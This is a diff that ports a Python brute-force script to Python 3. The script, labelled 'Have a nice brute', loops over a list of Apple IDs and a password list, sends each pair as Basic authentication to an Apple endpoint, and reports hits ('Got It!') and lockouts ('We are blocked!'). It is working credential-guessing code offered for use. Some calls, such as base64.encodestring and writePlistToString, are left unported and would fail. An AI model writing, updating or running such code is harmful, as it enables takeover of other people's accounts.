@@ -7,7 +7,7 @@
 #Have a nice brute
 
 import json
-import urllib2
+import urllib.request
 import plistlib
 from xml.dom.minidom import *
 from lxml import etree
@@ -17,7 +17,7 @@ import xml.etree.ElementTree
 import time
 import random
 import json
-import cookielib
+import http.cookiejar
 import urllib
 import time
 import socket
@@ -59,15 +59,13 @@ def TryPass(apple_id,password):
 
 	req_plist=plistlib.writePlistToString(json)
 
-	req = urllib2.Request(url, req_plist, headers=headers)
+	req = urllib.request.Request(url, req_plist, headers=headers)
 	base64string = base64.encodestring('%s:%s' % (apple_id, password)).replace('\n', '')
 	req.add_header("Authorization", "Basic %s" % base64string)
 
-
-
 	try:
-		resp = urllib2.urlopen(req)
-	except urllib2.HTTPError, err:
+		resp = urllib.request.urlopen(req)
+	except urllib.error.HTTPError as err:
 		if err.code == 401:
 			return False
 		if err.code == 330:
@@ -87,19 +85,18 @@ with open('mails.txt', 'r') as file:
 
 for apple_id in apple_ids.split('\n'):
 	if apple_id:
-		print 'Working with:',apple_id
+		print('Working with:', apple_id)
 		for pwd in passwords.split('\n'):
 			if pwd:
-				#print pwd
 				password = pwd.split(' ')[1]
-				print 'Trying: ', apple_id,password
+				print('Trying: ', apple_id, password)
 				
 				try:
-					result = TryPass(apple_id,password)
+					result = TryPass(apple_id, password)
 					if result == True:
-						print 'Got It!: ', apple_id,password
+						print('Got It!: ', apple_id, password)
 					if result == 'bad':
-						print 'We are blocked!: ',apple_id,password
+						print('We are blocked!: ', apple_id, password)
 				except:
-					print 'Protocol failed ',pwd
+					print('Protocol failed ', pwd)
 
